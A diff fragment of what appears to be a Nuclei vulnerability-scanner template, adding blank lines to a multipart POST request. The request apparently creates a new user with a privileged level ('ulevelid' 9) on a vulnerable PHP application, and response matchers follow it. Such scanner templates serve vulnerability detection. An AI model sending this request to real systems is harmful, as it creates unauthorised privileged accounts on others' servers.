@@ -22,27 +22,37 @@ requests:
         Content-Type: multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb
         Upgrade-Insecure-Requests: 1
         Cookie: PHPSESSID=pdnuclei
+
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="username"
+
         pdnuclei
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="passconf"
+
         Testing1@
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="password"
+
         Testing1@
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="email"
+
         nuclei@projectdiscovery.io
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="editid"
+
+
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="add"
+
         add
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="ulevelid"
+
         9
         --01b28e152ee044338224bf647275f8eb--
+
     matchers-condition: and
     matchers:
       - type: word
